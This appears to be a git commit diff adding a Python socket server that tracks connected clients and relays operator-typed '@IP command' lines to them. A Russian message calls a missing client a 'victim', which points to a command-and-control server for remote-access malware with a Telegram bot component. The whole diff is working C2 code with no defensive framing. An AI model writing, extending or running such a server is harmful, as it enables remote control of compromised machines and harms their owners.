063743bbc569de2eec306441a038ddd3a1f5eccc
x1nder <x1nder@proton.me>
2025-07-13 23:19:22 +0900

    пиздец

--- server/server.py
+++ server/server.py
@@ -58,13 +58,59 @@ bunner = f'''
     host: {host}
     port = {port}'''
 
-print(bunner)
-print("Check telegram bot...")
+clients = {}
 
-def check_bots():
+def handle_client(client_socket, addr):
+    #print(f"Подключен: {addr}")
+    clients[addr] = client_socket
+    while True:
+        try:
+            message = client_socket.recv(1024).decode('utf-8')
+            if not message:
+                break
+            #print(f"Received from {addr}: {message}")
+            if message == "telegram_bot":
+                print("[+] Telegram Bot connected")
+        except:
+            break
+
+    client_socket.close()
+    del clients[addr]
+
+def send_message_to_client(target_ip, message):
+    for addr, client_socket in clients.items():
+        if addr[0] == target_ip:
+            try:
+                client_socket.send(message.encode('utf-8'))
+                return
+            except:
+                client_socket.close()
+                del clients[addr]
+                return
+    print(f"{target_ip} такой жертвы нету")
+
+def command_listener():
+    while True:
+        command = input()
+        if command.startswith('@'):
+            parts = command.split(' ', 1)
+            if len(parts) == 2:
+                target_ip = parts[0][1:]
+                msg = parts[1]
+                send_message_to_client(target_ip, msg)
+            else:
+                print("@[IP] (команда) без квадратных и без скобок")
+
+def start_server():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((host, port))
-    server.listen(6)
+    server.listen(5)
+    print("[LOG] Server already.")
+    threading.Thread(target=command_listener, daemon=True).start()
+
     while True:
-        print("Waiting bot...")
-        conn, addr = server.accept()
+        client_socket, addr = server.accept()
+        threading.Thread(target=handle_client, args=(client_socket, addr)).start()
+
+if __name__ == "__main__":
+    start_server()
